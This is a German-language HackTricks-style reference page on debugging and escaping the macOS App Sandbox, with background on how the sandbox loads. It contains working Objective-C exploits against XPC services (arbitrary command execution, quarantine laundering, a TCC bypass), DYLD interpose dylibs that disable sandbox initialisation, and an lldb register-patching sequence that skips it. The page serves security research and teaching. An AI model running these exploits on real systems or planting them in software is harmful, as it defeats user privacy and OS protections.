# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox-Ladevorgang

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Bild aus <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Im vorherigen Bild ist zu sehen, **wie die Sandbox geladen wird**, wenn eine Anwendung mit dem Entitlement **`com.apple.security.app-sandbox`** ausgeführt wird.

Der Compiler linkt `/usr/lib/libSystem.B.dylib` mit dem Binary.

Anschließend ruft **`libSystem.B`** mehrere Funktionen auf, bis **`xpc_pipe_routine`** die Entitlements der Anwendung an **`securityd`** sendet. Securityd prüft, ob der Prozess innerhalb der Sandbox quarantänisiert werden soll, und quarantänisiert ihn gegebenenfalls.\
Schließlich wird die Sandbox durch einen Aufruf von **`__sandbox_ms`** aktiviert, das **`__mac_syscall`** aufruft.<sup>[[1]](#references)[[3]](#references)</sup>

## Mögliche Bypasses

### Quarantine-Attribut umgehen

**Von sandboxed Prozessen erstellten Dateien** wird das **Quarantine-Attribut** angehängt, um Sandbox escapes zu verhindern: Wenn du eine neue Anwendung ablegst und versuchst, sie zu starten, verhindert das Quarantine-Flag den Start. Wenn du daher **eine Datei oder einen Ordner *ohne* das Quarantine-Attribut ablegen kannst, kannst du die App Sandbox verlassen** — lege einfach ein `.app`-Bundle ab und starte es mit `open`, da der neu gestartete Prozess unter LaunchServices und nicht unter deiner Sandbox ausgeführt wird.

Der zuverlässige Weg zu einem **unquarantined Drop** besteht darin, **einen anderen Prozess zu bitten, die Datei für dich zu erstellen**. Wie in [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) von Mickey Jin dokumentiert, markiert die **App Sandbox** abgelegte Dateien mit Quarantine, XPC services, die unter der Service Sandbox ausgeführt werden, jedoch **nicht**. Mehrere nicht authentifizierte XPC services konnten daher als Primitive für "Quarantine Laundering" verwendet werden:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) und **CVE-2023-32414** (`ArchiveService`): Extrahieren ein von einer sandboxed App übergebenes Archiv an einen ausgewählten Speicherort, **ohne das Quarantine-xattr** auf den extrahierten Inhalt zu übertragen.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): Path traversal in `submitSignpostDataWithConfig:` ermöglichte das Erstellen **beliebiger Verzeichnisse ohne Quarantine**, was ausreicht, um außerhalb des Containers eine vollständige `.app`-Bundle-Struktur aufzubauen.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): Bindet ein quarantänisiertes DMG ein, **ohne das resultierende Gerät zu quarantänisieren**, sodass die Apps auf dem gemounteten Volume gestartet werden können.

> [!TIP]
> Beim Extrahieren wird normalerweise **das Executable-Permission-Bit entfernt**. Der in CVE-2023-27944 verwendete Workaround bestand darin, einen **Symlink** auf ein vorhandenes signiertes System-Binary (z. B. `/System/Library/CoreServices/Automator Application Stub`) als Haupt-Executable des Bundles zu platzieren. Dadurch bleibt es startfähig, ohne dass eine abgelegte Datei `+x` benötigt.

> [!CAUTION]
> Der Grund, warum dies funktioniert, ist, dass die Prüfung durch das **Flag des zu startenden Elements** gesteuert wird: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, und erst danach *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Kein Flag auf dem Bundle, das du startest, bedeutet keinen Gatekeeper-Pass — genau dieses Primitive stellen die oben genannten CVEs bereit.<sup>[[5]](#references)</sup>
>
> Beachte, dass du ein `.app`-Bundle, dessen Ausführung bereits autorisiert wurde (es besitzt ein Quarantine-xattr mit gesetztem Flag "authorized to run"), ebenfalls missbrauchen könntest ... außer dass du jetzt nicht in **`.app`**-Bundles schreiben kannst, sofern du nicht über bestimmte privilegierte TCC-Berechtigungen verfügst (die du innerhalb einer Sandbox nicht haben wirst).

### Missbrauch der Open-Funktionalität

In den [**letzten Beispielen für Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) ist zu sehen, wie die **`open`**-CLI-Funktionalität missbraucht werden könnte, um die Sandbox zu umgehen.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Selbst wenn eine Anwendung **für die Ausführung in einer Sandbox vorgesehen ist** (`com.apple.security.app-sandbox`), ist es beispielsweise möglich, die Sandbox zu umgehen, wenn sie von einem LaunchAgent (`~/Library/LaunchAgents`) **ausgeführt wird**.\
Wie in [**diesem Beitrag**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) erklärt, könntest du eine sandboxed Anwendung automatisch als LaunchAgent ausführen lassen und möglicherweise über DyLib-Umgebungsvariablen schädlichen Code injizieren, wenn du Persistenz erreichen möchtest.<sup>[[6]](#references)</sup>

### Auto-Start-Speicherorte missbrauchen

Wenn ein sandboxed Prozess **an einen Ort schreiben** kann, an dem **später eine unsandboxed Anwendung das Binary ausführen wird**, kann er **entkommen, indem er das Binary dort ablegt**. Gute Beispiele für solche Speicherorte sind `~/Library/LaunchAgents` oder `/System/Library/LaunchDaemons`.

Dafür benötigst du möglicherweise sogar **2 Schritte**: Einen Prozess mit einer **freizügigeren Sandbox** (`file-read*`, `file-write*`) dazu zu bringen, deinen Code auszuführen, der dann tatsächlich an einen Ort schreibt, an dem er **unsandboxed ausgeführt** wird.

Siehe diese Seite zu **Auto-Start-Speicherorten**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Andere Prozesse missbrauchen

Wenn du aus dem sandboxed Prozess heraus in der Lage bist, **andere Prozesse zu kompromittieren**, die in weniger restriktiven Sandboxes (oder ohne Sandbox) ausgeführt werden, kannst du in deren Sandboxes gelangen:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Verfügbare System- und User-Mach-Services

Die Sandbox erlaubt außerdem die Kommunikation mit bestimmten **Mach-Services** über XPC, die im Profil `application.sb` definiert sind. Wenn du in der Lage bist, einen dieser Services zu **missbrauchen**, kannst du möglicherweise die **Sandbox verlassen**.

Wie in [diesem Write-up](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) angegeben, werden die Informationen zu Mach-Services in `/System/Library/xpc/launchd.plist` gespeichert. Es ist möglich, alle System- und User-Mach-Services zu finden, indem innerhalb dieser Datei nach `<string>System</string>` und `<string>User</string>` gesucht wird.<sup>[[4]](#references)</sup>

Außerdem kann überprüft werden, ob ein Mach-Service für eine sandboxed Anwendung verfügbar ist, indem `bootstrap_look_up` aufgerufen wird:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Verfügbare PID-Mach-Dienste

Diese Mach-Dienste wurden erstmals missbraucht, um in [diesem Write-up aus der Sandbox auszubrechen](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Zu diesem Zeitpunkt waren **alle von einer Anwendung und ihrem Framework benötigten XPC-Dienste** in der PID-Domain der App sichtbar (dabei handelt es sich um Mach-Dienste mit `ServiceType` als `Application`).<sup>[[4]](#references)</sup>

Um **einen XPC-Dienst einer PID-Domain zu kontaktieren**, muss er lediglich innerhalb der App mit einer Zeile wie der folgenden registriert werden:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Außerdem ist es möglich, alle **Application** Mach-Services zu finden, indem in `System/Library/xpc/launchd.plist` nach `<string>Application</string>` gesucht wird.

Eine weitere Möglichkeit, gültige XPC-Services zu finden, besteht darin, die folgenden zu überprüfen:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Mehrere Beispiele, die diese Technik missbrauchen, finden sich im [**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Die folgenden Beispiele sind jedoch zusammengefasst.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Dieser Dienst akzeptiert jede XPC-Verbindung, indem er stets `YES` zurückgibt, und die Methode `runTask:arguments:withReply:` führt einen beliebigen Befehl mit beliebigen Parametern aus.

Der Exploit war „so einfach wie folgt“:
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Dieser XPC service erlaubte jeden Client, indem er immer `YES` zurückgab, und die Methode `createZipAtPath:hourThreshold:withReply:` akzeptierte den Pfad zu einem Ordner und komprimierte ihn in eine ZIP-Datei.

Daher ist es möglich, eine gefälschte App-Ordnerstruktur zu erstellen, sie zu komprimieren, anschließend zu dekomprimieren und auszuführen, um der Sandbox zu entkommen, da die neuen Dateien nicht über das Quarantäne-Attribut verfügen.

Der Exploit war:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Dieser XPC service ermöglicht es, dem XPC client über die Methode `extendAccessToURL:completion:` Lese- und Schreibzugriff auf eine beliebige URL zu gewähren, die jede Verbindung akzeptierte. Da der XPC service über FDA verfügt, ist es möglich, diese Berechtigungen zu missbrauchen, um TCC vollständig zu umgehen.

Der Exploit bestand darin:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Statisches Kompilieren und dynamisches Linken

[**Diese Untersuchung**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) entdeckte 2 Möglichkeiten, die Sandbox zu umgehen. Da die Sandbox im Userland angewendet wird, sobald die **libSystem**-Bibliothek geladen wird, würde ein Binary, das deren Laden vermeiden könnte, niemals sandboxed werden:<sup>[[2]](#references)</sup>

- Wenn das Binary **vollständig statisch kompiliert** wäre, könnte es das Laden dieser Bibliothek vermeiden.
- Wenn das **Binary keine Bibliotheken laden müsste** (weil sich der Linker ebenfalls in libSystem befindet), müsste es libSystem nicht laden.

### Shellcodes

Beachte, dass **selbst Shellcodes** auf ARM64 in `libSystem.dylib` gelinkt werden müssen:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Nicht geerbte Einschränkungen

Wie im **[Bonus dieses Beitrags](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** erklärt, kann eine Sandbox-Einschränkung wie:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
kann von einem neuen Prozess umgangen werden, der beispielsweise Folgendes ausführt:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Allerdings wird dieser neue Prozess natürlich keine Entitlements oder Privilegien vom übergeordneten Prozess erben.

### Entitlements

Beachte, dass einige **Aktionen** möglicherweise durch die **Sandbox** **erlaubt** werden, wenn eine Anwendung über ein bestimmtes **Entitlement** verfügt, wie zum Beispiel:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Weitere Informationen zu **Interposting** findest du unter:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer`, um die Sandbox zu verhindern
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### `__mac_syscall` interposen, um die Sandbox zu umgehen
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Sandbox mit lldb debuggen und umgehen

Kompilieren wir eine Anwendung, die sandboxed sein sollte:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Kompiliere anschließend die App:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Die Anwendung wird versuchen, die Datei **`~/Desktop/del.txt`** zu **lesen**, was die **Sandbox nicht erlauben wird**.\
> Erstelle dort eine Datei, da sie nach dem Umgehen der Sandbox gelesen werden kann:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Debuggen wir die Anwendung, um zu sehen, wann die Sandbox geladen wird:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Selbst wenn die Sandbox umgangen wurde, wird TCC** den Benutzer fragen, ob er dem Prozess erlauben möchte, Dateien vom Schreibtisch zu lesen

## References

- [1] [Jonathan Levin - Die Apple Sandbox: Tiefer in den Sumpf (HITB GSEC 2016 slides)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Umgehung der Mac App Store Sandbox](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Die Apple Sandbox: Tiefer in den Sumpf (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Eine neue Ära der macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Erklärt: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): macOS TCC Bypass w/ Telegram using DyLib Injection (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
